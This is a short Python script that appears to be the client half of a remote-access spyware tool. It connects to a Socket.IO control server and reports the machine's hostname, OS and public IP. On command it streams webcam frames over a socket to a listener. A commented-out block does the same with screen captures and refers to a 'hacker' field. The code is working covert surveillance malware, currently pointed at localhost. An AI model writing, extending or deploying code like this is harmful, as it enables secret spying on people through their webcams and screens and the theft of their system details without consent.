from copyreg import pickle
import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np
import struct
import cv2
import pickle
from time import sleep
import imutils

sio = socketio.Client()

isRemotting = False

cam = cv2.VideoCapture(0)

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })

@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False

@sio.on('remote start')
def remoteStart():
  sleep(1)
  global isRemotting
  isRemotting = True

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect(('localhost', 8001))

  cam.set(3, 320)
  cam.set(4, 240)

  encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]

  while isRemotting:
    ret, frame = cam.read()
    result, frame = cv2.imencode('.jpg', frame, encode_param)
    # frame을 String 형태로 변환
    data = np.array(frame)
    stringData = data.tostring()
 
    #서버에 데이터 전송
    #(str(len(stringData))).encode().ljust(16)
    s.sendall((str(len(stringData))).encode().ljust(16) + stringData)
  # while isRemotting:
  #   screen = pyautogui.screenshot()
  #   src = np.array(screen)

  #   sio.emit('stream monitor', {'src': src.tolist(), 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')